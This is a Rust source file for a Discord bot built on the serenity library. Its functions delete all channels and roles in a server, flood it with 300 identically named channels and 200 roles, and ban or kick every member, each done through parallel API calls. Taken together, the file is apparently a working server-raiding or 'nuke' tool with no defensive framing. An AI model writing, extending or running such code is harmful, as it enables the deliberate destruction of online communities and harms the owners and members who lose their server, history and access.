use serenity::all::{CreateChannel, EditRole};
use serenity::prelude::*;
use serenity::model::prelude::*;
use tokio::task;

pub async fn create_channels(name: &str, ctx: &Context, guild_id: GuildId) {
    let futures: Vec<_> = (0..300).map(|i| {
        let http = ctx.http.clone();
        let guild_id = guild_id.clone();
        let channel_builder = CreateChannel::new(name).kind(ChannelType::Text);

        task::spawn(async move {
            if let Err(err) = guild_id
                .create_channel(&http, channel_builder)
                .await
            {
                eprintln!("Error creating channel {}: {:?}", i, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn delete_channels(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let futures: Vec<_> = guild.channels(&ctx.http).await.unwrap().values().map(|channel| {
        let http = ctx.http.clone();
        let channel_id = channel.id;
        task::spawn(async move {
            if let Err(err) = channel_id.delete(&http).await {
                eprintln!("Error deleting channel {}: {:?}", channel_id, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn create_roles(name: &str, ctx: &Context, guild_id: GuildId) {
    let futures: Vec<_> = (0..200).map(|i| {
        let http = ctx.http.clone();
        let guild_id = guild_id.clone();

        let role_builder = EditRole::new().name(name);

        task::spawn(async move {
            if let Err(err) = guild_id
                .create_role(&http, role_builder)
                .await
            {
                eprintln!("Error creating role {}: {:?}", i, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn delete_roles(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let roles = guild.roles.clone();
    let futures: Vec<_> = roles.values().cloned().map(|mut role| {
        let http = ctx.http.clone();
        task::spawn(async move {
            if let Err(err) = role.delete(&http).await {
                eprintln!("Error deleting role {}: {:?}", role.id, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn ban_all(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let members = guild.members(&ctx.http, None, None).await.unwrap().to_vec();
    let futures: Vec<_> = members.iter().cloned().map(|member| {
        let http = ctx.http.clone();
        task::spawn(async move {
            if let Err(err) = member.ban(&http, 0).await {
                eprintln!("Error banning member {}: {:?}", member.user.id, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn kick_all(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let members = guild.members(&ctx.http, None, None).await.unwrap().to_vec();
    let futures: Vec<_> = members.iter().cloned().map(|member| {
        let http = ctx.http.clone();
        task::spawn(async move {
            if let Err(err) = member.kick(&http).await {
                eprintln!("Error kicking member {}: {:?}", member.user.id, err);
            }
        })
    }).collect();

    for future in futures {
        let _ = future.await;
    }
}